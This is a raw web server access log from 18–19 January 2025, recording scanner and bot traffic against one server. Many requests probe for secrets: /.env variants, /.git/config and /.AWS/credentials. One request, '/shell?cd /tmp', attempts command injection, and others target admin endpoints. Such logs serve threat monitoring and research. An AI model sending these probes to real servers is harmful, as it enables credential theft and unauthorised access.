193.142.146.175 - - [19/Jan/2025:00:00:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:00:00:32 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
45.230.66.55 - - [19/Jan/2025:00:11:36 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
162.142.125.197 - - [19/Jan/2025:00:16:00 +0000] "\x16\x03\x01" 400 523 "-" "-"
162.142.125.197 - - [19/Jan/2025:00:16:10 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [19/Jan/2025:00:16:12 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [19/Jan/2025:00:16:15 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [19/Jan/2025:00:16:17 +0000] "PRI * HTTP/2.0" 400 523 "-" "-"
195.3.223.40 - - [19/Jan/2025:00:17:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.172.90.143 - - [19/Jan/2025:01:22:00 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [19/Jan/2025:01:22:05 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
167.172.90.143 - - [19/Jan/2025:01:22:24 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [19/Jan/2025:01:22:28 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
179.43.191.146 - - [19/Jan/2025:01:59:59 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [19/Jan/2025:02:08:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.149 - - [19/Jan/2025:02:10:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:02:10:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.156.129.131 - - [19/Jan/2025:02:21:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.55.226 - - [19/Jan/2025:02:53:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.168 - - [19/Jan/2025:03:00:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.185 - - [19/Jan/2025:03:29:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [19/Jan/2025:03:36:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:03:36:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.104.11.4 - - [19/Jan/2025:03:46:49 +0000] "\x16\x03\x01" 400 523 "-" "-"
185.16.39.104 - - [19/Jan/2025:03:49:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.146.175 - - [19/Jan/2025:04:16:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:04:16:53 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
185.242.226.10 - - [19/Jan/2025:04:57:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
193.200.78.250 - - [19/Jan/2025:05:02:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
146.19.24.18 - - [19/Jan/2025:05:04:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [19/Jan/2025:05:11:26 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
79.54.195.94 - - [19/Jan/2025:05:43:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
146.19.24.168 - - [19/Jan/2025:05:46:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [19/Jan/2025:05:47:41 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [19/Jan/2025:05:47:41 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:05:59:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:05:59:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [19/Jan/2025:06:00:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [19/Jan/2025:06:03:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:06:06:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:06:06:21 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
92.255.57.58 - - [19/Jan/2025:06:25:39 +0000] "\x16\x03\x01\x05\xa8\x01" 400 523 "-" "-"
3.147.52.205 - - [19/Jan/2025:06:38:21 +0000] "\x16\x03\x01" 400 523 "-" "-"
3.147.52.205 - - [19/Jan/2025:06:38:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
146.19.24.168 - - [19/Jan/2025:07:21:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
178.215.236.132 - - [19/Jan/2025:07:29:08 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0"
78.153.140.149 - - [19/Jan/2025:07:33:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:07:33:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
159.89.237.190 - - [19/Jan/2025:07:37:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
198.235.24.23 - - [19/Jan/2025:07:42:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.190.28.21 - - [19/Jan/2025:07:45:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "python-requests/2.32.3"
87.120.115.119 - - [19/Jan/2025:07:55:18 +0000] "GET /.env HTTP/1.1" 302 350 "-" "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0"
209.38.81.233 - - [19/Jan/2025:08:14:02 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.196.220.253 - - [19/Jan/2025:08:23:53 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
5.181.190.248 - - [19/Jan/2025:08:29:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
179.43.191.146 - - [19/Jan/2025:08:35:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.43 - - [19/Jan/2025:08:42:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.146.175 - - [19/Jan/2025:09:07:10 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:09:07:10 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.149 - - [19/Jan/2025:09:12:01 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:09:12:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.189.152.11 - - [19/Jan/2025:09:12:58 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [19/Jan/2025:09:13:02 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
206.189.152.11 - - [19/Jan/2025:09:13:25 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [19/Jan/2025:09:13:29 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
147.185.132.22 - - [19/Jan/2025:09:29:11 +0000] "\x16\x03\x01" 400 523 "-" "-"
147.185.132.22 - - [19/Jan/2025:09:29:11 +0000] "\x16\x03\x01" 400 523 "-" "-"
147.182.159.242 - - [19/Jan/2025:09:33:12 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible)"
147.182.159.242 - - [19/Jan/2025:09:33:12 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "http://34.165.81.226/" "Mozilla/5.0 (compatible)"
45.33.80.243 - - [19/Jan/2025:09:45:56 +0000] "\x16\x03\x01" 400 523 "-" "-"
78.153.140.177 - - [19/Jan/2025:09:59:28 +0000] "\x16\x03\x01" 400 523 "-" "-"
78.153.140.177 - - [19/Jan/2025:09:59:28 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
78.153.140.177 - - [19/Jan/2025:09:59:28 +0000] "GET /.ENV HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre"
78.153.140.177 - - [19/Jan/2025:09:59:28 +0000] "GET /.Env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
78.153.140.177 - - [19/Jan/2025:09:59:28 +0000] "GET /.AWS/credentials HTTP/1.1" 302 331 "-" "Opera/9.62 (X11; Linux x86_64; U; ru) Presto/2.1.1"
78.153.140.177 - - [19/Jan/2025:09:59:30 +0000] "GET /.AWS/CREDENTIALS HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; tr-tr) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.3"
78.153.140.177 - - [19/Jan/2025:09:59:30 +0000] "GET /.Aws/credentials HTTP/1.1" 302 331 "-" "msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)"
78.153.140.177 - - [19/Jan/2025:09:59:31 +0000] "GET /.CONFIG.yaml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/534.50.2 (KHTML, like Gecko) Version/5.0.6 Safari/533.22.3"
78.153.140.177 - - [19/Jan/2025:09:59:33 +0000] "GET /.Config.yaml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 6.0.1; 5027B Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36"
78.153.140.177 - - [19/Jan/2025:09:59:33 +0000] "GET /.env.BAK HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)"
78.153.140.177 - - [19/Jan/2025:09:59:33 +0000] "GET /.ENV.example HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.1.1; NX008HD8G Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36"
78.153.140.177 - - [19/Jan/2025:09:59:34 +0000] "GET /.env.EXAMPLE HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
78.153.140.177 - - [19/Jan/2025:09:59:34 +0000] "GET /.ENV.EXAMPLE HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fi-fi) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3"
146.19.24.18 - - [19/Jan/2025:10:11:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
147.185.132.151 - - [19/Jan/2025:10:24:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.168 - - [19/Jan/2025:11:10:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [19/Jan/2025:11:12:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [19/Jan/2025:11:15:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.185.19.15 - - [19/Jan/2025:11:20:00 +0000] "GET / HTTP/1.0" 200 1761 "-" "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\""
185.247.137.224 - - [19/Jan/2025:11:41:46 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
78.153.140.149 - - [19/Jan/2025:11:52:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [19/Jan/2025:11:52:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [19/Jan/2025:12:06:30 +0000] "\x16\x03\x02\x01o\x01" 400 523 "-" "-"
34.77.127.183 - - [19/Jan/2025:12:06:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
139.59.101.104 - - [19/Jan/2025:12:24:48 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
45.164.177.9 - - [19/Jan/2025:12:47:39 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
146.19.24.168 - - [18/Jan/2025:00:14:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.226 - - [18/Jan/2025:00:20:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.242.226.10 - - [18/Jan/2025:00:24:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
31.13.224.222 - - [18/Jan/2025:00:29:42 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; MHA-AL00 Build/HUAWEIMHA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 MMWEBID/9772 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
147.185.132.30 - - [18/Jan/2025:00:31:53 +0000] "\x16\x03\x01" 400 523 "-" "-"
147.185.132.30 - - [18/Jan/2025:00:31:54 +0000] "\x16\x03\x01" 400 523 "-" "-"
139.162.71.210 - - [18/Jan/2025:00:32:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.148 - - [18/Jan/2025:00:42:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:00:42:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [18/Jan/2025:00:45:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [18/Jan/2025:00:47:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
5.181.190.248 - - [18/Jan/2025:00:48:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.172.90.143 - - [18/Jan/2025:00:57:02 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [18/Jan/2025:00:57:06 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
167.99.67.123 - - [18/Jan/2025:00:57:22 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [18/Jan/2025:00:57:27 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
146.19.24.18 - - [18/Jan/2025:01:45:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
69.10.43.184 - - [18/Jan/2025:01:54:44 +0000] "GET /shell?cd /tmp" 400 523 "-" "-"
147.185.132.192 - - [18/Jan/2025:01:55:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.168 - - [18/Jan/2025:01:56:41 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
18.189.11.103 - - [18/Jan/2025:01:59:52 +0000] "\x16\x03\x01" 400 523 "-" "-"
18.189.11.103 - - [18/Jan/2025:02:00:49 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:02:04:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:02:04:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
35.203.211.38 - - [18/Jan/2025:02:25:33 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
95.214.55.185 - - [18/Jan/2025:03:03:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [18/Jan/2025:03:05:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [18/Jan/2025:03:17:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:03:17:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.169.191.223 - - [18/Jan/2025:03:22:27 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
95.214.55.226 - - [18/Jan/2025:03:39:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [18/Jan/2025:04:02:57 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.146.175 - - [18/Jan/2025:04:04:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:04:04:08 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
193.142.146.175 - - [18/Jan/2025:04:10:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:04:10:46 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
92.255.57.58 - - [18/Jan/2025:04:11:35 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.240.192.85 - - [18/Jan/2025:04:17:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
64.62.156.19 - - [18/Jan/2025:04:23:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
64.62.156.21 - - [18/Jan/2025:04:26:57 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
64.62.156.12 - - [18/Jan/2025:04:27:56 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
205.210.31.32 - - [18/Jan/2025:04:41:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.168 - - [18/Jan/2025:04:43:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
34.22.192.129 - - [18/Jan/2025:04:49:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
199.45.154.136 - - [18/Jan/2025:05:01:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.154.136 - - [18/Jan/2025:05:01:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.136 - - [18/Jan/2025:05:01:56 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.136 - - [18/Jan/2025:05:01:57 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.136 - - [18/Jan/2025:05:01:58 +0000] "PRI * HTTP/2.0" 400 523 "-" "-"
92.255.57.58 - - [18/Jan/2025:05:12:56 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [18/Jan/2025:05:12:57 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:05:17:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:05:17:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [18/Jan/2025:05:28:00 +0000] "\x16\x03\x01\x05\xa8\x01" 400 523 "-" "-"
46.19.138.234 - - [18/Jan/2025:05:42:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [18/Jan/2025:05:46:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
185.74.83.103 - - [18/Jan/2025:05:52:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.181.190.248 - - [18/Jan/2025:05:59:55 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [18/Jan/2025:06:30:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
